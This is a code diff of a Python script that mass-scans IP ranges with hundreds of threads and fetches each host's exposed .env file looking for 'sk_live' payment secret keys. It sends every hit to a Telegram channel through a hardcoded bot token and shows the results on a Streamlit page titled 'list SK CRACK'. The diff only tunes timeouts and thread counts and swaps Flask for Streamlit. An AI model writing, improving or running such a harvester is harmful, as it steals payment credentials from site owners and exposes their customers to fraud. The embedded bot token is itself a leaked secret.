@@ -3,13 +3,11 @@ from requests.exceptions import Timeout
 import ipaddress
 import concurrent.futures
 import telebot
-from flask import Flask, render_template
-
-app = Flask(__name__)
+import streamlit as st
 
 # Replace 'YOUR_BOT_TOKEN' with your actual bot token
 bot = telebot.TeleBot('1915896583:AAErqDx6EsDZS5aASNq8eKNicHT5c-7COmA')
-telegram_channel = '@ilham_maulana1'  # Replace with your actual channel username
+telegram_channel = '@Ilham_maulana1'  # Replace with your actual channel username
 
 def send_telegram_message(message):
     bot.send_message(telegram_channel, message)
@@ -29,7 +27,7 @@ def check_ip(ip):
     }
 
     try:
-        response = requests.get(url, headers=headers, timeout=4)
+        response = requests.get(url, headers=headers, timeout=3)
         if "sk_live" in response.text:
             print(f"IP: {ip}, Response: Found sk_live")
             message = f"IP: http://{ip}/.env, Response: Found sk_live"
@@ -47,7 +45,7 @@ def check_cidr(cidr_str):
     cidr_range = ipaddress.IPv4Network(cidr_str)
     ip_addresses = [str(ip) for ip in cidr_range.hosts()]
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
         executor.map(check_ip, ip_addresses)
 
 def check_cidrs_from_file(file_path):
@@ -56,14 +54,11 @@ def check_cidrs_from_file(file_path):
             cidr_str = line.strip()
             check_cidr(cidr_str)
 
-@app.route('/')
-def view_vision():
-    with open('vision.txt', 'r') as file:
-        content = file.read()
-    return render_template('vision_template.html', content=content)
-
 # Mengecek alamat IP untuk setiap CIDR dalam daftar dari file "cidr.txt"
 check_cidrs_from_file('cidr.txt')
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+# Streamlit app to display the contents of vision.txt
+st.title("list SK CRACK")
+with open('vision.txt', 'r') as vision_file:
+    vision_contents = vision_file.read()
+    st.text_area("Vision File Contents", vision_contents)
